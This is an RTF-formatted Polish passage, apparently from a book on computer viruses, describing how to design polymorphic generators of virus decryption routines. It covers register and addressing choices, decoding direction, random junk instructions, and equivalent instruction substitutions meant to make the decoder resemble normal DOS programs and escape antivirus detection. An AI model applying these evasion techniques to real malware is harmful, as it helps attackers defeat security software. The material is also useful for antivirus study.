\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Prawdziwie polimorficzne generatory zmiennych procedur szyfruj\uc1\u261\'b9cych powinny tworzy\uc1\u263\'e6 przy ka\uc1\u380\'bfdym uruchomieniu ca\uc1\u322\'b3kowicie now\uc1\u261\'b9, unikaln\uc1\u261\'b9 procedur\uc1\u281\'ea dekoduj\uc1\u261\'b9c\uc1\u261\'b9. Procedura taka najcz\uc1\u281\'ea\uc1\u347\'9cciej zachowuje tylko funkcje poni\uc1\u380\'bfszej sekwenq'i:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LICZNIK:=IleDanych }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INDEX:=Pocz\uc1\u261\'b9tekZaszyfrowanegoKodu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch FOR I:=1 to Licznik do begin}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    DEKODUJ_1 DAN\uc1\u260\'a5 [INDEX]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    DEKODUJ_2 DANA [INDEX]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    DEKODUJ_N DANA [INDEX]     }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    INDEX:=INDEX + PRZYROST ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch end;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dla ka\uc1\u380\'bfdej procedury dekoduj\uc1\u261\'b9cej generator losuje najcz\uc1\u281\'ea\uc1\u347\'9cciej odpowiednio:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > indeks;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > licznik;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > kierunek zwi\uc1\u281\'eakszania licznika;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > kierunek dekodowania;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > rodzaj u\uc1\u380\'bf}{\f1\fs24\lang1045{\*\listtag0}ywanych instrukcji (8086, 80286 itd.).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Licznik oznacza najcz\uc1\u281\'ea\uc1\u347\'9cciej rejestry procesora wybierane z listy (E)AX, (E)BX, (E)CX, (E)DX, (E)BP, (E)SI, (E)DI. Rejestr (E)SP jest z wiadomych wzgl\uc1\u281\'ead\'f3w pomijany. Oczywi\uc1\u347\'9ccie, mo\uc1\u380\'bfliwe jest tak\uc1\u380\'bfe u\uc1\u380\'bfycie rejestr\'f3w 8-bitowych (najpro\uc1\u347\'9cciej jako licznika). Litera (E) oznacza, i\uc1\u380\'bf mo\uc1\u380\'bfliwe jest wybranie tak\uc1\u380\'bfe rejestr\'f3w 32 bitowych, jednak nale\uc1\u380\'bfy pami\uc1\u281\'eata\uc1\u263\'e6, \uc1\u380\'bfe u\uc1\u380\'bfycie ich znacz\uc1\u261\'b9co komplikuje sam\uc1\u261\'b9 procedur\uc1\u281\'ea generuj\uc1\u261\'b9c\uc1\u261\'b9.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Z kolei indeks wybierany jest z listy mo\uc1\u380\'bfliwych sposob\'f3w adresowania dla procesor\'f3w 80x86. Mo\uc1\u380\'bfe to by\uc1\u263\'e6 wi\uc1\u281\'eac [BX+????], [BP+????], [SI+????], [DI+????], [BP+SI+????], [BP+DI+????], [BX+SI+????] lub [BX+DI+????]. S\uc1\u261\'b9 to wszystkie mo\uc1\u380\'bfliwo\uc1\u347\'9cci, jakie mo\uc1\u380\'bfe zawiera\uc1\u263\'e6 pole MmRejMem w instrukcjach operuj\uc1\u261\'b9cych na danych w pami\uc1\u281\'ea}{\f1\fs24\lang1045{\*\listtag0}ci.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Liczb\uc1\u281\'ea r\'f3\uc1\u380\'bfnych indeks\'f3w mo\uc1\u380\'bfna poszerzy\uc1\u263\'e6 poprzez u\uc1\u380\'bfycie sposob\'f3w adresowania, kt\'f3re pojawi\uc1\u322\'b3y si\uc1\u281\'ea w procesorach 386 i wy\uc1\u380\'bfszych. Umo\uc1\u380\'bfliwiaj\uc1\u261\'b9 one (poprzez zastosowanie s\uc1\u322\'b3owa rozkazowego SIB) zastosowanie do adresowania wszystkich u\uc1\u380\'bfytkowych rejestr\'f3w proces}{\f1\fs24\lang1045{\*\listtag0}ora.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kierunek zwi\uc1\u281\'eakszania licznika okre\uc1\u347\'9cla, czy licznik ro\uc1\u347\'9cnie a\uc1\u380\'bf do warto\uc1\u347\'9cci maksymalnej, czy te\uc1\u380\'bf maleje od tej warto\uc1\u347\'9cci do zera.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Kierunek dekodowania okre\uc1\u347\'9cla, od kt\'f3rej strony zacznie si\uc1\u281\'ea dekodo-wanie wirusa po uruchomieniu procedury; czy od pocz\uc1\u261\'b9tku zaszyfro-wanego kodu, czy te\uc1\u380\'bf od jego ko\uc1\u324\'f1ca. Konsekwencj\uc1\u261\'b9 obranych kierunk\'f3w b\uc1\u281\'ead\uc1\u261\'b9 odpowiednie rozkazy zwi\uc1\u281\'eakszaj\uc1\u261\'b9ce lub zmniejszaj\uc1\u261\'b9ce indeks i licznik. Od kierunk\'f3w r\'f3wnie\uc1\u380\'bf zale\uc1\u380\'bfe\uc1\u263\'e6 b\uc1\u281\'eadzie instrukcja sprawdzaj\uc1\u261\'b9ca warunek zako\uc1\u324\'f1czenia p\uc1\u281\'eatli dekoduj\uc1\u261\'b9cej. Stopie\uc1\u324\'f1 }{\f1\fs24\lang1045{\*\listtag0}s}{\f0\fs24\lang1045{\*\listtag0}komplikowania samego dekodera wzro\uc1\u347\'9cnie, je\uc1\u380\'bfeli pozwolimy na dynamiczne zmiany licznika i indeksu podczas dzia\uc1\u322\'b3ania programu. Na przyk\uc1\u322\'b3ad, je\uc1\u380\'bfeli pocz\uc1\u261\'b9tkowy licznik ustalimy jako CX, to po kilku wygenerowanych instrukcjach nale\uc1\u380\'bfy za pomoc\uc1\u261\'b9 instrukcji MOV R}{\f1\fs24\lang1045{\*\listtag0}E}{\f0\fs24\lang1045{\*\listtag0}jl6, CX lub XCHG REJ16, CX wymusi\uc1\u263\'e6 zmian\uc1\u281\'ea licznika na inny.Je\uc1\u347\'9cli chcemy skomplikowa\uc1\u263\'e6 ca\uc1\u322\'b3\uc1\u261\'b9 procedur\uc1\u281\'ea i uczyni\uc1\u263\'e6 j\uc1\u261\'b9 polimorficzn\uc1\u261\'b9, nale\uc1\u380\'bfy mi\uc1\u281\'eadzy instrukcje stanowi\uc1\u261\'b9ce integraln\uc1\u261\'b9 cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 dekodera wstawi\uc1\u263\'e6 rozkazy niepotrzebne z punktu widzenia dzia\uc1\u322\'b3ania programu}{\f1\fs24\lang1045{\*\listtag0},}{\f0\fs24\lang1045{\*\listtag0} lecz niezb\uc1\u281\'eadne do zaciemnienia i ukrycia g\uc1\u322\'b3\'f3wnej procedury dekodu-j\uc1\u261\'b9cej (rozkazy te musz\uc1\u261\'b9 by\uc1\u263\'e6 wybierane losowo).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch O ile w procedurze semi-polimorficznej do zaciemnienia kodu dekodera s\uc1\u322\'b3u\uc1\u380\'bfy\uc1\u322\'b3 tylko jeden rozkaz, JMP SHORT, o tyle w przypadku pe\uc1\u322\'b3nej procedury polimorficznej nale\uc1\u380\'bfy uwzgl\uc1\u281\'eadni\uc1\u263\'e6 jak najwi\uc1\u281\'eaksz\uc1\u261\'b9 ilo\uc1\u347\'9c\uc1\u263\'e6 rozkaz\'f3w procesora.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Instrukcje stanowi\uc1\u261\'b9ce taki wype\uc1\u322\'b3niacz musz\uc1\u261\'b9 spe\uc1\u322\'b3nia\uc1\u263\'e6 kilka warunk\'f3w. Najwa\uc1\u380\'bfniejsze Jest to, aby rozkazy te:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > nie zamazywa\uc1\u322\'b3y dowolnie nie u\uc1\u380\'bfywanej przez siebie pami\uc1\u281\'eaci;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > nie zawies}{\f0\fs24\lang1045{\*\listtag0}za\uc1\u322\'b3y komputera;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > nie powodowa\uc1\u322\'b3y generowania wyj\uc1\u261\'b9tk\'f3w;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > nie niszczy\uc1\u322\'b3y zawarto\uc1\u347\'9cci wa\uc1\u380\'bfnych dla dzia\uc1\u322\'b3ania programu rejestr\'f3w (m.in. CS, SS, SP oraz rejestr\'f3w stanowi\uc1\u261\'b9cych indeks i licznik).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 powy\uc1\u380\'bfszych ogranicze\uc1\u324\'f1 mo\uc1\u380\'bfna omin\uc1\u261\'b9\uc1\u263\'e6, o ile wykonana operacja zostanie odwr\'f3cona, a wi\uc1\u281\'eac mo\uc1\u380\'bfliwe jest np. zamazanie pami\uc1\u281\'eaci, ale tylko pod warunkiem, i\uc1\u380\'bf w zniszczone miejsce wpiszemy chwil\uc1\u281\'ea p\'f3\uc1\u378\'9fniej oryginaln\uc1\u261\'b9, zapami\uc1\u281\'eatan\uc1\u261\'b9 wcze\uc1\u347\'9cniej zawarto\uc1\u347\'9c\uc1\u263\'e6. Podobnie ma si\uc1\u281\'ea sprawa ze zmienianiem rejestr\'f3w. Je\uc1\u380\'bfeli chcemy np. zmieni\uc1\u263\'e6 r}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0}jestr b\uc1\u281\'ead\uc1\u261\'b9cy licznikiem, mo\uc1\u380\'bfemy jego warto\uc1\u347\'9c\uc1\u263\'e6 na chwil\uc1\u281\'ea zapisa\uc1\u263\'e6 do innego rejestru lub na stosie, a nast\uc1\u281\'eapnie zmieni\uc1\u263\'e6 go tak, aby po wykonaniu kilku kolejnych instrukcji przywr\'f3ci\uc1\u263\'e6 jego oryginaln\uc1\u261\'b9 zawarto\uc1\u347\'9c\uc1\u263\'e6.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Najprostszy spos\'f3b to wstawienie jako wype\uc1\u322\'b3niacza instrukcji 1-bajtowych, jednak jest ich tak niewiele w li\uc1\u347\'9ccie rozkaz\'f3w, i\uc1\u380\'bf procedura zawieraj\uc1\u261\'b9ca tylko takie instrukcje b\uc1\u281\'eadzie \uc1\u322\'b3atwa do wykrycia. Ponadto zbyt du\uc1\u380\'bfa ich ilo\uc1\u347\'9c\uc1\u263\'e6 w programie te\uc1\u380\'bf nie jest po\uc1\u380\'bf\uc1\u261\'b9dana, gdy\uc1\u380\'bf z regu\uc1\u322\'b3y programy u\uc1\u380\'bfywaj\uc1\u261\'b9 instrukcji kil}{\f1\fs24\lang1045{\*\listtag0}k}{\f0\fs24\lang1045{\*\listtag0}ubajtowych, w zwi\uc1\u261\'b9zku z czym nadmiar instrukcji 1-bajtowych mo\uc1\u380\'bfe wyda\uc1\u263\'e6 si\uc1\u281\'ea podejrzany (zw\uc1\u322\'b3aszcza programowi antywirusowemu).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pami\uc1\u281\'eata\uc1\u263\'e6 trzeba, i\uc1\u380\'bf najlepiej by\uc1\u322\'b3oby, gdyby wygenerowana procedura przypomina\uc1\u322\'b3a fragment typowych program\'f3w komputerowych, st\uc1\u261\'b9d te\uc1\u380\'bf wskazane jest u\uc1\u380\'bfywanie w generatorze wywo\uc1\u322\'b3ywa\uc1\u324\'f1 przerwa\uc1\u324\'f1 BIOS i funkcji systemu DOS (np. sprawdzanie wersji systemu DOS, sprawdzanie, czy jest jaki\uc1\u347\'9c klawisz w buforze klawiatury itp.), kt\'f3re spowoduj\uc1\u261\'b9, i\uc1\u380\'bf ewentualnemu programowi antywirusowemu program wyd}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0} si\uc1\u281\'ea typow\uc1\u261\'b9 aplikacj\uc1\u261\'b9.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Innymi, prostymi do wykorzystania instrukcjami s\uc1\u261\'b9 rozkazy operuj\uc1\u261\'b9ce na akumulatorze (AX) i na jego m\uc1\u322\'b3odszej cz\uc1\u281\'ea\uc1\u347\'9cci (AL), gdy\uc1\u380\'bf posiadaj\uc1\u261\'b9 uproszczone w stosunku do innych rejestr\'f3w kody. R\'f3wnie\uc1\u380\'bf operacje przypisywania rejestrom roboczym jakiej\uc1\u347\'9c warto\uc1\u347\'9cci s\uc1\u261\'b9 bardzo proste do wstawienia (grupa rozkaz\'f3w MOV REJ/???? o kodach B0/??-B7/?? dla rejestr\'f3w AL - BH lub B8/????-BF/???? dla rejestr\'f3w AX - DI).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Troch\uc1\u281\'ea trudniejsza jest symulacja operacji stosowych, rozkaz\'f3w skok\'f3w i wywo\uc1\u322\'b3a\uc1\u324\'f1 procedur, jednak, jak pokazuj\uc1\u261\'b9 istniej\uc1\u261\'b9ce generatory, mo\uc1\u380\'bfna je z powodzeniem stosowa\uc1\u263\'e6. Aby procedura dekoduj\uc1\u261\'b9ca by\uc1\u322\'b3a jak najbardziej podobna do fragmentu typowego programu, warto stosowa\uc1\u263\'e6 instrukcje modyfikuj\uc1\u261\'b9ce jakie\uc1\u347\'9c kom\'f3rki w pami\uc1\u281\'eaci. U\uc1\u380\'bfywaj\uc1\u261\'b9c ich nale\uc1\u380\'bfy pami\uc1\u281\'eata\uc1\u263\'e6, i\uc1\u380\'bf zmodyfikowan\uc1\u261\'b9 warto\uc1\u347\'9c\uc1\u263\'e6 nale\uc1\u380\'bfy p\'f3\uc1\u378\'9fniej bezwzgl\uc1\u281\'eadnie przywr\'f3ci\uc1\u263\'e6 (chyba, \uc1\u380\'bfe mamy pewno\uc1\u347\'9c\uc1\u263\'e6, i\uc1\u380\'bf jest to dana nieistotna np. w kodzie wirusa).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Korzystaj\uc1\u261\'b9c z operacji dzia\uc1\u322\'b3aj\uc1\u261\'b9cych w pami\uc1\u281\'eaci na argumentach typu word i dword nie wolno zapomina\uc1\u263\'e6 o tym, i\uc1\u380\'bf np. przy adresowaniu bazowym lub indeksowym warto\uc1\u347\'9cci rejestr\'f3w (SI, DI, BX, BP) b\uc1\u281\'ead\uc1\u261\'b9 najcz\uc1\u281\'ea\uc1\u347\'9cciej nie ustalone, st\uc1\u261\'b9d mo\uc1\u380\'bfe wyst\uc1\u261\'b9pi\uc1\u263\'e6 sytuacja, w kt\'f3rej instrukcja b\uc1\u281\'eadzie pobiera\uc1\u322\'b3a lub modyfikowa\uc1\u322\'b3a dan\uc1\u261\'b9 z pogranicza dw\'f3ch segment\'f3w. Innymi s\uc1\u322\'b3owy, offset obliczany na}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}podstawie indeksu b\uc1\u281\'eadzie mia\uc1\u322\'b3 np. warto\uc1\u347\'9c\uc1\u263\'e6 0FFFFh, co przy pr\'f3bie dost\uc1\u281\'eapu do danej word lub dword z miejsca pami\uc1\u281\'eaci okre\uc1\u347\'9clonego przez ten offset spowoduje wyst\uc1\u261\'b9pienie wyj\uc1\u261\'b9tku (numer 13 - og\'f3lne naruszenie mechanizm\'f3w ochrony).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Aby uwzgl\uc1\u281\'eadni\uc1\u263\'e6 w generatorze jak najpe\uc1\u322\'b3niejsz\uc1\u261\'b9 list\uc1\u281\'ea rozkaz\'f3w, nale\uc1\u380\'bfy zaopatrzy\uc1\u263\'e6 si\uc1\u281\'ea w spis instrukcji procesor\'f3w 80x86 i ich kod\'f3w maszynowych, a nast\uc1\u281\'eapnie przeanalizowa\uc1\u263\'e6 ka\uc1\u380\'bfd\uc1\u261\'b9 z instrukcji pod k\uc1\u261\'b9tem jej przydatno\uc1\u347\'9cci jako cz\uc1\u281\'ea\uc1\u347\'9cci wype\uc1\u322\'b3niacza oraz warunk\'f3w, w kt\'f3rych zadzia\uc1\u322\'b3a ona popra}{\f1\fs24\lang1045{\*\listtag0}w}{\f0\fs24\lang1045{\*\listtag0}nie. Dobrym przyk\uc1\u322\'b3adem mo\uc1\u380\'bfe by\uc1\u263\'e6 analiza instrukcji LODSB, kt\'f3r\uc1\u261\'b9 chcieliby\uc1\u347\'9cmy zastosowa\uc1\u263\'e6 zamiast instrukcji INC SI. Opr\'f3cz tego, i\uc1\u380\'bf modyfikuje ona rejestr AX (dok\uc1\u322\'b3adniej AL), pami\uc1\u281\'eata\uc1\u263\'e6 trzeba, i\uc1\u380\'bf jej poprawne dzia\uc1\u322\'b3anie zale\uc1\u380\'bfne jest tak\uc1\u380\'bfe od stanu bitu kieru}{\f1\fs24\lang1045{\*\listtag0}n}{\f0\fs24\lang1045{\*\listtag0}ku DF, zawartego w rejestrze znacznik\'f3w. U\uc1\u380\'bfywaj\uc1\u261\'b9c jej musimy mie\uc1\u263\'e6 wi\uc1\u281\'eac pewno\uc1\u347\'9c\uc1\u263\'e6, i\uc1\u380\'bf wcze\uc1\u347\'9cniej wyst\uc1\u261\'b9pi\uc1\u322\'b3a ju\uc1\u380\'bf instrukcja CLD, kt\'f3ra w\uc1\u322\'b3a\uc1\u347\'9cciwie ustawi\uc1\u322\'b3a bit DF.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Powy\uc1\u380\'bfszy przyk\uc1\u322\'b3ad zosta\uc1\u322\'b3 dobrany celowo, gdy\uc1\u380\'bf pokazuje on, \uc1\u380\'bfe aby uzyska\uc1\u263\'e6 dany efekt, nie trzeba wcale u\uc1\u380\'bfywa\uc1\u263\'e6 szablonowych instrukcji, lecz poprzez u\uc1\u380\'bfycie odpowiednich zamiennik\'f3w (dzia\uc1\u322\'b3aj\uc1\u261\'b9cych}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch tak samo) mo\uc1\u380\'bfna uzyska\uc1\u263\'e6 jeszcze wi\uc1\u281\'eaksz\uc1\u261\'b9 zmienno\uc1\u347\'9c\uc1\u263\'e6 procedury de-koduj\uc1\u261\'b9cej. Innymi przyk\uc1\u322\'b3adami mog\uc1\u261\'b9 tu by\uc1\u263\'e6 tak\uc1\u380\'bfe poni\uc1\u380\'bfsze operacje zeruj\uc1\u261\'b9ce rejestr CX:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV CX,0               ; najbardziej trywialne zerowanie rejestru CX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch XOR CX,CX              ; operacja XOR na tych samych operandach zeruje je}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB CX,CX              ; odejmij CX od CX, w efekcie CX=0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch AND CX,0               ; iloczyn logiczny z zerem jest zerem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZerujCX:               ; po wykonaniu p\uc1\u281\'eatli LOOP ZerujCX          }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                        ; rejestr CX b\uc1\u281\'eadzie r\'f3wny O}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV CX,XYZ             ; wpisz do rejstru CX warto\uc1\u347\'9c\uc1\u263\'e6 }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB CX,XYZ             ; i potem j\uc1\u261\'b9 od niego odejmij}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV REJ16,0            ; zeruj jaki\uc1\u347\'9c rejestr 16-bitowy }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV CX,REJl6           ; i za jego pomoc\uc1\u261\'b9 zeruj rejestr CX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch XOR CL,CL              ; kombinacje powy\uc1\u380\'bfszych operacji dla rejestr\'f3w 8-bitowych SUB CH,CH              ; CL i CH \uc1\u322\'b3\uc1\u261\'b9cznie tak\uc1\u380\'bfe wyzeruja rejestr CX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Oczywi\uc1\u347\'9ccie, powy\uc1\u380\'bfsze sekwencje nie wyczerpuj\uc1\u261\'b9 wszystkich mo\uc1\u380\'bfliwo\uc1\u347\'9cci.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Powy\uc1\u380\'bfsz\uc1\u261\'b9 operacj\uc1\u281\'ea nale\uc1\u380\'bfy stosowa\uc1\u263\'e6 przy doborze nie tylko instrukcji modyfikuj\uc1\u261\'b9cych indeks i licznik, ale i przy rozkazach b\uc1\u281\'ead\uc1\u261\'b9cych integraln\uc1\u261\'b9 cz\uc1\u281\'ea\uc1\u347\'9cci\uc1\u261\'b9 dekodera. Mo\uc1\u380\'bfna np. zamiast jednej instrukq'i ADD [INDEX],???? u\uc1\u380\'bfy\uc1\u263\'e6:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CLC ADC [INDEX], ????}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB [INDEX],-????}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV REJ,???? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ADD [INDEX],REJ}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Mo\uc1\u380\'bfliwo\uc1\u347\'9cci jest tu, podobnie jak poprzednio, bardzo du\uc1\u380\'bfo. Po wygenerowaniu procedura dekoduj\uc1\u261\'b9ca powinna mie\uc1\u263\'e6 posta\uc1\u263\'e6 podobn\uc1\u261\'b9 do poni\uc1\u380\'bfszej sekwencji:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch .......                  ; wype\uc1\u322\'b3niacz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch inicjuj rejestr  - licznik lub indeks }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch .......                   ; wype\uc1\u322\'b3niacz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch inicjuj rejestr - indeks lub licznik }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch .......                  ; wype\uc1\u322\'b3niacz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch pierwsza instrukcja dekodera}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch .......                  ; wype\uc1\u322\'b3niacz}{\f2\fs24\lang1045{\*\listtag0}\par}
